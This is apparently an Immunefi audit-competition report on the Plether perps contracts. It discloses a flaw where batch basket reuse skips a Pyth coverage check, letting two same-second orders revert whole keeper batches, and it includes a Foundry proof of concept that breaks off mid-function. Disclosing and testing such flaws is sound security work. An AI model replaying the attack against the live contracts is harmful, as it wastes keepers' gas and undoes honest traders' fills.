# \#98649 [SC-Medium] Batch basket reuse skips the Pyth storage coverage check, so two same-second orders with an ordinary split-second basket revert every `executeOrderBatch` and roll back the orders already filled in it

**Submitted on Nov 9th 2026 at 08:36:27 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98649
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Block stuffing

## Description

## Affected contracts (in-scope commit `a82d4fef`; live on Arbitrum Sepolia v2.0.0)

The program states that the v2.0.0 Arbitrum Sepolia release is built from a commit whose `packages/perps/src` is identical to `a82d4fef`. I read the live wiring and oracle settings with read-only calls. The live `OrderRouter` points to the `PletherOracle` and execution sidecar below. The live oracle has six Pyth feeds, a 5-second maximum component publish-time divergence and a 15-second order settlement window. The proof of concept runs in the repository's Foundry suite at the in-scope commit, with the release Router configuration and Pyth mocked. No in-scope contract is modified.

| Contract | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|
| `OrderRouterExecutionSidecar` | `0x0ae016ef599bcdf0bbbedba441401c3b6c6184ea` | **Root cause.** `_canReuseHistoricalBatchBasket` approves basket reuse without the storage coverage check, and `_prepareBatchOracle` re-raises the Oracle's coverage revert, which reverts the whole batch |
| `PletherOracle` | `0x4f2c62a0e03657f52c633c19c11f88d8f0897bb2` | On reuse, `updateBatchOrderExecutionPrice` requires every stored feed to be at least as new as the cached basket's **newest** component. The first resolution only proves each feed at its own component time |
| `OrderRouter` | `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` | Public `commitOrder`, `executeOrderBatch` and `executeOrder` |
| `OrderLifecycleBook` | `0x327d5fd04e17d96dd5c4f845a0b4256a9e19645c` | Order status. Every order in the reverted batch stays `Pending` |

Release Router configuration used (`packages/perps/DEPLOYMENT.md` and the program page), applied through the owner's 72-hour timelocked config path: `maxExecutionWindowSeconds` 60, `orderExecutionStalenessLimit` 60, `liquidationStalenessLimit` 15, `basketMaxConfidenceRatioBps` 10, `orderSettlementWindow` 15, `maxComponentPublishTimeDivergence` 5, `adverseConfidenceMultiplierBps` 2500, `minOpenNotionalAssets` 1,000 USDG, open-order bounty 1 bp (0.01–0.2 USDG), protection trigger bounty 0.2 USDG, `maxPendingOrders` 5, `minEngineGas` 600,000, `maxPruneOrdersPerCall` 64. The risk parameters are the release values, with a 4 bps execution fee.

## Brief/Intro

`executeOrderBatch` parses one signed historical Pyth basket and reuses it for later FIFO orders committed in the same second. The basket's publish time is its **newest** component. When the Router reuses a basket, `PletherOracle` requires every feed **in Pyth storage** to be at least that new. The first resolution only stored each feed at its own component time. So whenever the six components' first post-commit ticks are not all published in the same second, the reuse reverts with `PletherOracle__StoredFeedBehind`.

The documentation says the Router checks cache coverage before reusing, and otherwise requests a new historical resolution. It does not. `_canReuseHistoricalBatchBasket` has no coverage check, and the batch's oracle preparation re-raises every Oracle error except the parser-failure wrapper. A single unmet coverage check therefore reverts the keeper's whole transaction. That includes the orders already filled earlier in the same batch.

Two orders committed in the same block are enough. An attacker who holds any position can supply them for free: two partial closes reserve no execution bounty and pay no fee at commit. In the proof of concept, the attacker's two closes cost 1,969,332 gas and a 0.000001 USDG carry checkpoint. They make three successive keeper batches revert at 4,214,568–4,214,645 gas each. The three honest orders already filled in each batch are rolled back and stay `Pending`. The batch keeps reverting until a keeper takes the pair out of the batch and executes those two orders one by one. Two honest traders committing in the same block cause the same revert without any attacker.

## Vulnerability Details

### The first resolution proves each feed only at its own component time

On a fresh resolution, the Oracle parses the signed payload, pushes it to Pyth, and checks storage coverage **per parsed feed, at that feed's own publish time**:

`PletherOracle.sol`, lines 613–626:

```solidity
try pyth.parsePriceFeedUpdatesUnique{value: pythFee}(
    pythUpdateData, pythFeedIds, minPublishTime, maxPublishTime
) returns (
    PythStructs.PriceFeed[] memory parsedFeeds
) {
    basket = _computeBasketPriceFromFeeds(
        PriceMode.OrderExecution, parsedFeeds, maxComponentPublishTimeDivergence
    );
    // Reverts in the success body are NOT caught by the historical-parse catch below.
    // Keep the parsed basket as the pricing source even if storage already contains newer prices.
    pyth.updatePriceFeeds{value: pythFee}(pythUpdateData);
    for (uint256 i; i < parsedFeeds.length; ++i) {
        _requireStoredFeedCoverage(parsedFeeds[i].id, parsedFeeds[i].price.publishTime);
    }
```

The basket accepts components up to `maxComponentPublishTimeDivergence` (5 seconds at release) apart. Its `publishTime` is the newest component and `oldestPublishTime` the oldest. Both go into the batch cache (`PletherOracle.sol`, lines 288–297).

### Reuse demands that every stored feed reach the newest component

`PletherOracle.sol`, lines 262–275:

```solidity
if (!policy.oracleFrozen && _canReuseHistoricalBatchBasket(request.commitTime, cache)) {
    // Cache contents are caller-supplied; independently prove storage coverage, not price authenticity.
    for (uint256 i; i < pythFeedIds.length; ++i) {
        _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
    }
    basket = BasketPrice({
        price: cache.price,
        confidence: cache.confidence,
        publishTime: cache.publishTime,
        oldestPublishTime: cache.oldestPublishTime,
        pythFee: 0
    });
    reusedBasket = true;
```

`PletherOracle.sol`, lines 645–653:

```solidity
function _requireStoredFeedCoverage(
    bytes32 feedId,
    uint256 requiredPublishTime
) internal view {
    uint256 storedPublishTime = pyth.getPriceUnsafe(feedId).publishTime;
    if (storedPublishTime < requiredPublishTime) {
        revert PletherOracle__StoredFeedBehind(feedId, storedPublishTime, requiredPublishTime);
    }
}
```

Take a basket whose five components are at `t+1` and whose sixth is at `t+2`. After the first resolution, Pyth storage holds the five feeds at `t+1` and the sixth at `t+2`. Every reuse of that basket then needs all six feeds at `t+2` or later. Unless some other transaction has already advanced storage, the first lagging feed fails the check.

### The Router reuses without the coverage check, and the revert takes the whole batch with it

The Router decides reuse with its own predicate, which checks the commit-time window and nothing about storage:

`OrderRouterExecutionSidecar.sol`, lines 1074–1093:

```solidity
function _canReuseHistoricalBatchBasket(
    IPletherOracle oracle,
    CfdTypes.Order memory order,
    IPletherOracle.BatchOrderPriceCache memory cache
) private view returns (bool) {
    if (oracle.isOracleFrozen() || !cache.hasHistoricalBasket) {
        return false;
    }
    uint64 commitTime = order.commitTime;
    if (
        commitTime < cache.minReusableCommitTime || commitTime >= cache.oldestPublishTime
            || commitTime >= cache.publishTime
    ) {
        return false;
    }
    if (cache.publishTime > block.timestamp) {
        return false;
    }
    return uint256(cache.publishTime) <= uint256(commitTime) + oracle.orderSettlementWindow();
}
```

When the predicate returns `true`, the Router forwards no Pyth funding (`fee = 0`, lines 996–1005) and calls the Oracle with the cache. The Oracle's coverage revert is not treated as "do not reuse":

`OrderRouterExecutionSidecar.sol`, lines 1009–1030:

```solidity
try oracle.updateBatchOrderExecutionPrice{value: fee}(
    state.executor, pythUpdateData, oracleRequest, state.oracleCache
) returns (
    bool resolved,
    IPletherOracle.PriceSnapshot memory resolvedSnapshot,
    IPletherOracle.BatchOrderPriceCache memory resolvedCache
) {
    ok = resolved;
    snapshot = resolvedSnapshot;
    nextCache = resolvedCache;
} catch (bytes memory reason) {
    if (
        reason.length != 68
            || _selector(reason) != IPletherOracle.PletherOracle__HistoricalParserFailure.selector
    ) {
        assembly ("memory-safe") {
            revert(add(reason, 32), mload(reason))
        }
    }
    // The reverted Oracle call returned its funding to the Router; the outer refund handles it once.
    return (OrderV3Types.PendingReason.OracleFailure, result, state.oracleCache);
}
```

`PletherOracle__StoredFeedBehind` is 100 bytes long and has a different selector, so it is re-raised. The keeper's `executeOrderBatch` reverts. Every fill, terminal outcome and mark update the batch had already finalized is undone. The same signed payload resolves the same order **freshly** without any problem: the proof of concept executes it alone with `executeOrder` and the identical payload.

### Who can trigger it

Reuse applies only to a later order whose commit time is at or after the cached basket's commit time and before its oldest component. In practice, that is usually a second order committed in the same block as the order that triggered the fresh resolution. Then the first post-commit ticks of the six feeds must not all fall in one second. The keeper's natural payload is the first signed tick of every feed after each commit second, and a feed that does not publish in a given second contributes a tick from a later second. The Oracle's own 5-second divergence allowance exists for exactly such baskets.

- **Honest coincidence.** Any two orders from any traders committed in the same block, followed by a split-second basket, revert every batch that reaches the second of them (`test_NoAttacker_TwoHonestSameSecondOrdersRevertBatch`).
- **Deliberate.** A trader with an open position commits two partial closes in one transaction or block. Close orders reserve no execution bounty (`OrderReservationAccounting._reserveExecutionBounty`, zero-bounty close path). A target price that can never be met makes both closes fail terminally when they are finally executed alone, so the attacker keeps its position and can repeat. The attacker cannot choose the Pyth publish times. A pair whose first post-commit basket happens to land in one second does nothing, and the attacker simply commits another pair.

### Documented behavior, and the published items that look related

The documented batch-reuse behavior is the one the Router does not implement:

`ORACLE_SYNCHRONIZATION.md`, lines 59–64:

> ### Batch reuse
>
> The Router starts each execution call with an empty in-memory historical cache and only populates it after a successful parse and synchronization. Reuse for a later order requires all components to follow that order's commit, fit its historical window and satisfy cache coverage. Otherwise the Router requests a new historical resolution.

`SECURITY.md`, line 649, lists as a security property: "batch execution may reuse a parsed historical basket only for later FIFO orders whose `commitTime` is strictly before the cached tick and falls within its proven coverage".

Three published items look related. None of them describes this behavior:

- **Failure table, `ORACLE_SYNCHRONIZATION.md` line 109:** "`PletherOracle__StoredFeedBehind(...)`, insufficient funding or failed cache coverage | Reverts the transaction, including earlier batch progress." This row states what the Oracle does when it is called with a cache that storage does not cover. That case arises with the Oracle's lower-level helper and a caller-supplied cache (lines 66–68 of the same file). Per lines 62–63, the public Router is supposed to check coverage first and request a new resolution instead. The row does not say that honest same-block orders with an ordinary split-second basket make the Router send such a call.
- **"Batch-atomic" oracle preparation** (`OrderRouter.sol` lines 250–252, `IPerpsKeeper.sol` lines 37–38). This describes how a genuine oracle failure propagates. Here, no oracle failure exists: the same payload resolves the same order freshly. The revert comes only from the Router choosing reuse where its documented precondition does not hold.
- **Repository tests.** `test_CacheReuseRequiresCoverageAndDoesNotRepair` (`test/perps/spec/oracle/OracleSynchronization.t.sol` lines 371–390) calls the Oracle helper directly and forces the lag with `setPrice` on the mock, so it never goes through the Router batch. `test_BatchReusesBasketWhenEveryComponentFollowsBothCommits` (lines 434–452) does reuse a basket whose components are one second apart through the Router. Before calling the batch, though, it writes a newer update for every feed directly into Pyth storage (line 446). That direct write supplies exactly the coverage that an ordinary keeper payload does not.

I did not find this issue in the program's known-issues list or in the published audit reports.

## Exploitation

The proof of concept uses the repository's `BasePerpTest` stack. It installs a six-feed basket oracle (component prices 1.00, five weights of 0.1 and one of 0.5, the same fixture as the repository's oracle-synchronization tests) through the owner's timelocked oracle-config path. The release risk parameters and Router configuration are applied through the owner's timelocked paths. LP capital and every order go through the public `TrancheVault` / `HousePool` / `OrderRouter` entry points. Pyth (the suite's `MockPyth`, update fee `FEE` = 1 gwei per Pyth call) is the only signed-data source. Nothing writes Pyth storage directly during the scenario: storage changes only through the Oracle's own `updatePriceFeeds` calls inside public Router calls. Gas is measured with `gasleft()` around each call.

1. Setup: an LP deposits 1,000,000 USDG into Junior through the public request/settle/claim path. After a public `updateMarkPrice`, the attacker opens an ordinary 5,000 USDG LONG with 100 USDG margin through `commitOrder` and `executeOrder`.
2. At second `t0`, three honest traders each commit a 2,000 USDG LONG open with 50 USDG margin.
3. At `t1 = t0 + 3`, the attacker commits, in one block, two partial closes of 1,500 USDG of its LONG. The target price (1) can never be met. The two commits cost 1,969,332 gas. The attacker's settlement balance changes by -0.000001 USDG, which is the carry checkpoint of its own position: closes reserve no bounty and pay no fee at commit.
4. At `t1 + 3`, a keeper calls `executeOrderBatch` up to the last order. The payload contains the first signed tick of every feed after each commit second. For the honest orders, all six feeds tick at `t0 + 1`. For the pair, feeds 1–5 tick at `t1 + 1` and feed 6 at `t1 + 2`, because it did not publish at `t1 + 1`.
5. In the batch, the first honest order resolves freshly (one parse, 2 × `FEE`) and the other two reuse that basket, so all three fill. The first close resolves freshly: its basket has `publishTime = t1 + 2` and `oldestPublishTime = t1 + 1`. The second close commits at `t1`, so the Router reuses that basket. The Oracle requires all six stored feeds to be at or after `t1 + 2`. Feed 1 is stored at `t1 + 1`, and the call reverts with `PletherOracle__StoredFeedBehind(feed 1, t1 + 1, t1 + 2)`, asserted byte for byte. The sidecar re-raises it, and the keeper's transaction reverts. The three honest fills are undone, all three orders remain `Pending`, and the queue head does not move. The batch used 4,214,568 gas.
6. The keeper retries two seconds later, and again two seconds after that, with the same payload. Both attempts revert the same way (4,214,601 and 4,214,645 gas). In total, 12,643,814 keeper gas is spent with no order executed.
7. Control: from the same state without the pair, one batch with one historical parse (2 × `FEE`) executes the three honest orders for 3,776,895 gas.
8. Fallback: a keeper that splits the work executes the three honest orders in one batch and the two closes singly with the same payload. That takes 4,628,626 gas and three parses (6 × `FEE`). A keeper that executes all five orders singly needs 4,838,851 gas and five parses (10 × `FEE`). Each single call resolves freshly with the same payload and succeeds. Both closes end `Failed`, and the next ordinary batch executes normally again, until the attacker commits a new pair.

## Impact Details

**Medium — Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).**

- **Users:** honest traders whose orders sit in a batch that reaches the pair lose their fills. The orders already executed in the same transaction are rolled back and stay pending until a keeper changes how it batches. Two honest traders who commit in the same block cause the same failure for everyone queued behind them, with no attacker involved.
- **Protocol and keepers:** every batch that reaches the pair burns the keeper's gas (4.21M gas per attempt in the proof of concept) and executes nothing. To make progress, the keeper has to detect the failure, then execute the blocking orders outside the batch and pay a fresh Pyth resolution for each of them. The batch path that the documentation describes as safe for reuse (lines 59–64) fails under ordinary signed data.
- **Attacker:** no profit. The attacker pays only the gas for two close commits and re-arms with a new pair after each one is consumed. Its position is untouched because both closes fail on their own target price.

## Recommendation

Make the Router's reuse decision include the coverage condition that the Oracle enforces, as `ORACLE_SYNCHRONIZATION.md` lines 62–63 describe, so that an uncovered basket leads to a new historical resolution instead of a revert:

```solidity
// PletherOracle: read-only helper for the Router
function storedFeedsCover(uint256 publishTime) external view returns (bool) {
    for (uint256 i; i < pythFeedIds.length; ++i) {
        if (pyth.getPriceUnsafe(pythFeedIds[i]).publishTime < publishTime) return false;
    }
    return true;
}

// OrderRouterExecutionSidecar._canReuseHistoricalBatchBasket, before the final return:
if (!oracle.storedFeedsCover(cache.publishTime)) {
    return false; // resolve this order freshly; funding is checked on the fresh path
}
```

Alternatively, treat `PletherOracle__StoredFeedBehind` from a reuse attempt as "not reusable" and retry the same order with a funded fresh resolution. Keep the Oracle's own coverage check unchanged, because it protects the lower-level helper against caller-supplied caches. Add a Router batch test in which two same-second orders face a basket with components one second apart, **without** writing newer prices directly into Pyth storage, and assert that the batch executes both orders with two parses.


## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/BatchCacheCoverageRevert.t.sol` and run from the repository root:

```bash
forge test --root packages/perps --match-contract BatchCacheCoverageRevertPoC -vv
```

The file contains four tests:
- `test_Attack_PairRevertsEveryBatchAndRollsBackPrefix`: the attack, three keeper attempts, exact revert data, rolled-back prefix, gas;
- `test_Control_BatchExecutesVictimsWithOneParse`: the same honest orders without the pair;
- `test_FallbackCost_BisectAndSingles`: the bisecting and the all-singles keeper, and the next batch after the pair is consumed;
- `test_NoAttacker_TwoHonestSameSecondOrdersRevertBatch`: two honest same-block orders cause the same revert.

The suite's Router is the repository's test harness, which only adds a legacy scalar `commitOrder` overload. The proof uses the production V3 `commitOrder(OrderRequest)`, `executeOrder`, `executeOrderBatch` and `updateMarkPrice` entry points. There is no `vm.store`, `deal`, `etch` or `mockCall` on in-scope contracts.

### Complete test:

<details>
<summary>Complete test</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice When `executeOrderBatch` reuses a historical basket for a later order, `PletherOracle` requires EVERY stored
///         Pyth feed to be at least as new as the basket's NEWEST component. The first historical parse only proves
///         each feed at its own component time. With an ordinary signed payload whose six component ticks are not all
///         published in the same second, the reuse reverts `PletherOracle__StoredFeedBehind`; the Router does not treat
///         it as "do not reuse" and the whole batch reverts, including orders already executed earlier in the call.
///
///         An attacker who holds a position commits two zero-bounty partial closes in one block. Every honest keeper
///         batch that reaches them reverts until they are executed one by one or expire.
///
///         Public calls only: LP capital through TrancheVault/HousePool, orders through OrderRouter.commitOrder /
///         executeOrder / executeOrderBatch. MockPyth supplies signed price data and USDG is the mock token; no
///         vm.store / deal / etch / mockCall on in-scope contracts and no manual pre-push of Pyth storage during the
///         scenario. Release risk parameters and Router configuration.
contract BatchCacheCoverageRevertPoC is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant BOB = address(0xB0B);
    address internal constant CAROL = address(0xCA201);
    address internal constant ATTACKER = address(0xBADBAD);
    address internal constant KEEPER = address(0xE0EC);
    address internal constant LP = address(0x1D1105);

    uint256 internal constant FEE = 1 gwei; // MockPyth per-update fee; the oracle forwards 2 * FEE per historical parse
    int64 internal constant PRICE = 100_000_000;
    uint64 internal constant CONF = 50_000; // 5 bps per component, inside the 10 bps basket confidence limit

    uint256 internal orderNonce;
    uint64 internal t0; // victims' commit second
    uint64 internal t1; // attacker's commit second
    uint64[3] internal victimIds;
    uint64[2] internal attackerIds;

    // ------------------------------------------------------------------ configuration (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // LP capital enters through the public request/settle/claim path
    }

    function setUp() public override {
        super.setUp();
        // Six-feed basket oracle (the release basket has six FX components), rotated in by the owner's timelocked path.
        bytes32[] memory ids = _feedIds();
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        for (uint256 i; i < 6; ++i) {
            weights[i] = i == 5 ? 0.5e18 : 0.1e18;
            bases[i] = 1e8;
        }
        baseMockPyth.setAllPrices(ids, PRICE, -8, SETUP_TIMESTAMP);
        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), ids, weights, bases, new bool[](6)
        );
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(pletherOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        _applyReleaseRouterConfig(); // 72 h timelock
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC, live market
        vm.roll(block.number + 1);
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);
        baseMockPyth.setFee(FEE);
        vm.deal(KEEPER, 10 ether);

        // Public LP capital (no open positions, so settlement is permissionless).
        settlementToken.mint(LP, 1_000_000e6);
        vm.startPrank(LP);
        settlementToken.approve(address(juniorVault), 1_000_000e6);
        uint256 rid = juniorVault.requestDeposit(1_000_000e6, LP, LP);
        vm.stopPrank();
        uint256 start = juniorVault.depositEpochStart(rid);
        if (vm.getBlockTimestamp() < start) vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = juniorVault.claimableDepositRequest(rid, LP);
        vm.prank(LP);
        juniorVault.claimDeposit(rid, claimable, LP, LP);

        _fundTrader(ALICE, 10_000e6);
        _fundTrader(BOB, 10_000e6);
        _fundTrader(CAROL, 10_000e6);
        _fundTrader(ATTACKER, 10_000e6);

        // Public mark refresh (any keeper), then the attacker opens an ordinary 5,000 USDG LONG through the public path.
        uint64 m = uint64(vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.updateMarkPrice{value: 10 * FEE}(_window(m - 1, m, m));
        _advance(m + 1);
        uint64 c = uint64(vm.getBlockTimestamp());
        uint64 id = _commitOpen(ATTACKER, 5_000e18, 100e6);
        _advance(c + 2);
        vm.prank(KEEPER);
        router.executeOrder{value: 10 * FEE}(id, _window(c, c + 1, c + 1));
        assertGt(_size(ATTACKER), 0, "attacker position not opened");
        _advance(uint64(vm.getBlockTimestamp()) + 30);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Control: the same three honest orders, no attacker pair. One keeper batch executes all three with ONE
    ///         historical parse (the basket is reused for the same-second orders).
    function test_Control_BatchExecutesVictimsWithOneParse() external {
        _commitVictims();
        _advance(t0 + 6);
        uint256 pythBefore = address(baseMockPyth).balance;
        uint256 parsesBefore = baseMockPyth.parseUniqueCallCount();
        uint256 g = gasleft();
        vm.prank(KEEPER);
        OrderV3Types.BatchResult memory r = router.executeOrderBatch{value: 10 * FEE}(victimIds[2], _victimWindow());
        uint256 gasUsed = g - gasleft();
        assertEq(r.terminalCount, 3, "not every victim order executed");
        assertEq(baseMockPyth.parseUniqueCallCount() - parsesBefore, 1, "more than one historical parse");
        assertEq(address(baseMockPyth).balance - pythBefore, 2 * FEE, "Pyth funding for the batch");
        for (uint256 i; i < 3; ++i) assertGt(_size(_victim(i)), 0, "victim not filled");
        emit log_named_uint("CONTROL: keeper batch gas (3 orders, 1 parse)", gasUsed);
        emit log_named_uint("CONTROL: Pyth funding (units of FEE)", 2);
    }

    /// @notice Attack: the attacker's two zero-bounty partial closes, committed in one block after the victims, make
    ///         every keeper batch revert; the already-executed victim prefix is rolled back; the keeper's gas is lost.
    function test_Attack_PairRevertsEveryBatchAndRollsBackPrefix() external {
        _commitVictims();
        (uint256 attackerGas, int256 attackerCollateralChange) = _commitAttackerPair();
        _advance(t1 + 3);
        uint64 headBefore = router.nextExecuteId();
        bytes[] memory payload = _naturalPayload();
        bytes memory expected = abi.encodeWithSelector(
            IPletherOracle.PletherOracle__StoredFeedBehind.selector, bytes32(uint256(1)), uint256(t1 + 1), uint256(t1 + 2)
        );

        uint256 wasted;
        for (uint256 attempt; attempt < 3; ++attempt) {
            uint256 g = gasleft();
            vm.prank(KEEPER);
            (bool ok, bytes memory ret) = address(router).call{value: 10 * FEE}(
                abi.encodeCall(router.executeOrderBatch, (attackerIds[1], payload))
            );
            uint256 used = g - gasleft();
            assertFalse(ok, "batch did not revert");
            assertEq(ret, expected, "unexpected revert reason");
            wasted += used;
            emit log_named_uint("ATTACK: reverted keeper batch gas, attempt", used);
            assertEq(router.nextExecuteId(), headBefore, "queue head moved");
            for (uint256 i; i < 3; ++i) {
                assertEq(_size(_victim(i)), 0, "victim fill survived the revert");
                assertEq(
                    uint256(router.lifecycleBook().lifecycleStatus(victimIds[i])),
                    uint256(OrderV3Types.LifecycleStatus.Pending),
                    "victim order not pending"
                );
            }
            _advance(uint64(vm.getBlockTimestamp()) + 2); // the keeper retries two seconds later
        }
        emit log_named_uint("ATTACK: keeper gas wasted by 3 reverted batches", wasted);
        emit log_named_uint("ATTACK: attacker gas for the two close commits", attackerGas);
        emit log_named_decimal_int("ATTACK: attacker settlement change from the commits (USDG)", attackerCollateralChange, 6);
        // Closes reserve no bounty and pay no fee at commit; the only movement is the position's own carry checkpoint.
        assertGt(attackerCollateralChange, -10_000, "the pair cost the attacker more than 0.01 USDG");
    }

    /// @notice Forced fallback: the keeper must split the work. Bisecting keeper: batch the victims only, then the pair
    ///         one by one. Naive keeper: every order singly (each single call pays its own 2 * FEE parse).
    function test_FallbackCost_BisectAndSingles() external {
        _commitVictims();
        _commitAttackerPair();
        _advance(t1 + 3);
        bytes[] memory payload = _naturalPayload();
        uint256 snap = vm.snapshotState();

        // Reference: the batch the keeper intended, had the reuse not reverted, would need two parses (4 * FEE).
        // Bisecting keeper.
        uint256 pyth0 = address(baseMockPyth).balance;
        uint256 g = gasleft();
        vm.prank(KEEPER);
        OrderV3Types.BatchResult memory r = router.executeOrderBatch{value: 10 * FEE}(victimIds[2], payload);
        assertEq(r.terminalCount, 3, "victim-only batch did not execute");
        vm.prank(KEEPER);
        router.executeOrder{value: 2 * FEE}(attackerIds[0], payload);
        vm.prank(KEEPER);
        router.executeOrder{value: 2 * FEE}(attackerIds[1], payload);
        uint256 bisectGas = g - gasleft();
        uint256 bisectFee = address(baseMockPyth).balance - pyth0;
        assertEq(bisectFee, 6 * FEE, "bisect Pyth funding");
        assertEq(router.nextExecuteId(), 0, "queue not drained");
        for (uint256 i; i < 2; ++i) {
            assertEq(
                uint256(router.lifecycleBook().lifecycleStatus(attackerIds[i])),
                uint256(OrderV3Types.LifecycleStatus.Failed),
                "attacker close did not fail terminally"
            );
        }
        emit log_named_uint("FALLBACK bisect: gas (1 batch + 2 singles)", bisectGas);
        emit log_named_uint("FALLBACK bisect: Pyth funding (units of FEE)", bisectFee / FEE);

        // After the pair is consumed, the next ordinary batch works again (the attacker must re-inject a pair).
        uint64 c = uint64(vm.getBlockTimestamp());
        uint64 next = _commitOpen(ALICE, 2_000e18, 50e6);
        _advance(c + 2);
        vm.prank(KEEPER);
        r = router.executeOrderBatch{value: 10 * FEE}(next, _window(c, c + 1, c + 1));
        assertEq(r.terminalCount, 1, "later batch blocked after the pair was consumed");

        vm.revertToState(snap);
        // Naive keeper: every order singly.
        pyth0 = address(baseMockPyth).balance;
        g = gasleft();
        for (uint256 i; i < 3; ++i) {
            vm.prank(KEEPER);
            router.executeOrder{value: 2 * FEE}(victimIds[i], payload);
        }
        for (uint256 i; i < 2; ++i) {
            vm.prank(KEEPER);
            router.executeOrder{value: 2 * FEE}(attackerIds[i], payload);
        }
        uint256 singlesGas = g - gasleft();
        uint256 singlesFee = address(baseMockPyth).balance - pyth0;
        assertEq(singlesFee, 10 * FEE, "each single call pays its own 2 * FEE parse");
        for (uint256 i; i < 3; ++i) assertGt(_size(_victim(i)), 0, "victim not filled by singles");
        emit log_named_uint("FALLBACK singles: gas (5 single calls)", singlesGas);
        emit log_named_uint("FALLBACK singles: Pyth funding (units of FEE)", singlesFee / FEE);
    }

    /// @notice No attacker needed: two honest orders committed in the same second revert every batch whenever their
    ///         first post-commit basket is not published in one second.
    function test_NoAttacker_TwoHonestSameSecondOrdersRevertBatch() external {
        uint64 c = uint64(vm.getBlockTimestamp());
        uint64 a = _commitOpen(ALICE, 2_000e18, 50e6);
        uint64 b = _commitOpen(BOB, 2_000e18, 50e6);
        _advance(c + 4);
        vm.prank(KEEPER);
        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__StoredFeedBehind.selector, bytes32(uint256(1)), uint256(c + 1), uint256(c + 2)
            )
        );
        router.executeOrderBatch{value: 10 * FEE}(b, _window(c, c + 1, c + 2));
        assertEq(uint256(router.lifecycleBook().lifecycleStatus(a)), uint256(OrderV3Types.LifecycleStatus.Pending));
    }

    // ------------------------------------------------------------------ scenario helpers

    function _commitVictims() internal {
        t0 = uint64(vm.getBlockTimestamp());
        victimIds[0] = _commitOpen(ALICE, 2_000e18, 50e6);
        victimIds[1] = _commitOpen(BOB, 2_000e18, 50e6);
        victimIds[2] = _commitOpen(CAROL, 2_000e18, 50e6);
    }

    /// @dev Two zero-bounty partial closes of the attacker's LONG, in one block, three seconds after the victims. Their
    ///      LONG-close target of 1 can never be met, so each terminally fails on slippage when finally executed.
    function _commitAttackerPair() internal returns (uint256 gasUsed, int256 collateralChange) {
        _advance(t0 + 3);
        t1 = uint64(vm.getBlockTimestamp());
        int256 before = int256(clearinghouse.balanceAssets(ATTACKER));
        uint256 g = gasleft();
        attackerIds[0] = _commitClose(ATTACKER, 1_500e18);
        attackerIds[1] = _commitClose(ATTACKER, 1_500e18);
        gasUsed = g - gasleft();
        collateralChange = int256(clearinghouse.balanceAssets(ATTACKER)) - before;
    }

    /// @dev The keeper's natural historical payload: for each commit second, the FIRST signed tick of every feed after
    ///      it. Victims (commit t0): all six components at t0+1. Attacker pair (commit t1): five components at t1+1, the
    ///      sixth at t1+2 (it published at t1, then not again until t1+2) - an ordinary unequal component time.
    function _naturalPayload() internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory a = _updates(t0, t0 + 1, t0 + 1);
        MockPyth.FeedUpdate[] memory b = _updates(t1, t1 + 1, t1 + 2);
        MockPyth.FeedUpdate[] memory both = new MockPyth.FeedUpdate[](a.length + b.length);
        for (uint256 i; i < a.length; ++i) {
            both[i] = a[i];
            both[a.length + i] = b[i];
        }
        data = new bytes[](1);
        data[0] = abi.encode(both);
    }

    function _victimWindow() internal view returns (bytes[] memory) {
        return _window(t0, t0 + 1, t0 + 1);
    }

    /// @dev One signed tick per feed: feeds 1-5 at `fiveAt`, feed 6 at `sixthAt`, all with `prev` as previous time.
    function _window(
        uint64 prev,
        uint64 fiveAt,
        uint64 sixthAt
    ) internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = abi.encode(_updates(prev, fiveAt, sixthAt));
    }

    function _updates(
        uint64 prev,
        uint64 fiveAt,
        uint64 sixthAt
    ) internal pure returns (MockPyth.FeedUpdate[] memory updates) {
        bytes32[] memory ids = _feedIds();
        updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint64 at = i == 5 ? sixthAt : fiveAt;
            updates[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(PRICE, CONF, -8, at, prev));
        }
    }

    function _feedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
